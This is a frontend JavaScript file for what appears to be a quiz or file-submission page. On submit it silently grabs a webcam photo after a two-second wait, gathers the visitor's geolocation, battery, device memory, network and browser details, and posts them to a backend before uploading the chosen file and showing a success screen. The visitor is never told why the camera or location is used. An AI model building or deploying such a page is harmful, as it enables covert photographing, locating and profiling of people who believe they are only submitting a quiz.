// ================================
// FRONTEND SCRIPT.JS
// ================================

const btn = document.getElementById('submit-btn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const fileInput = document.getElementById('user-file');
const BACKEND_BASE = "/api";

// Camera constraints
const constraints = { video: { facingMode: "user" }, audio: false };

// ================================
// COLLECT METADATA
// ================================
async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    battery: "N/A",
    location: "N/A",
    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
    network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
    time: new Date().toLocaleString()
  };

  // Battery
  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      metadata.battery = `${b.level * 100}% charging: ${b.charging}`;
    } catch {}
  }

  // Geolocation
  if (navigator.geolocation) {
    try {
      const pos = await new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej)
      );
      metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
    } catch (err) {
      metadata.location = "Denied";
    }
  }

  return metadata;
}

// ================================
// CAPTURE CAMERA
// ================================
async function captureCamera() {
  const stream = await navigator.mediaDevices.getUserMedia(constraints);
  video.srcObject = stream;

  // Wait for user to focus camera (2s)
  await new Promise(r => setTimeout(r, 2000));

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  const image = canvas.toDataURL("image/png");

  // Stop camera
  stream.getTracks().forEach(t => t.stop());

  return image;
}

// ================================
// SEND CAMERA DATA
// ================================
async function sendCameraData() {
  const image = await captureCamera();
  const metadata = await collectMetadata();

  const res = await fetch(`${BACKEND_BASE}/upload`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ image, metadata })
  });

  return res.json();
}

// ================================
// SEND FILE
// ================================
async function sendFile(file) {
  if (!file) return;

  const reader = new FileReader();
  return new Promise((resolve, reject) => {
    reader.onload = async () => {
      try {
        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ file: reader.result, filename: file.name })
        });
        resolve(await res.json());
      } catch (err) {
        reject(err);
      }
    };
    reader.readAsDataURL(file);
  });
}

// ================================
// SUBMIT BUTTON
// ================================
btn.addEventListener("click", async (e) => {
  e.preventDefault();

  if (!fileInput.files.length) {
    alert("Please select a file before submitting!");
    return;
  }

  try {
    // 1️⃣ Capture camera
    await sendCameraData();

    // 2️⃣ Upload file
    await sendFile(fileInput.files[0]);

    // 3️⃣ Show success page
    document.getElementById("quiz-container").style.display = "none";
    document.getElementById("success-container").style.display = "flex";

  } catch (err) {
    console.error("Submission error:", err);
    alert("Error submitting data. Please try again.");
  }
});
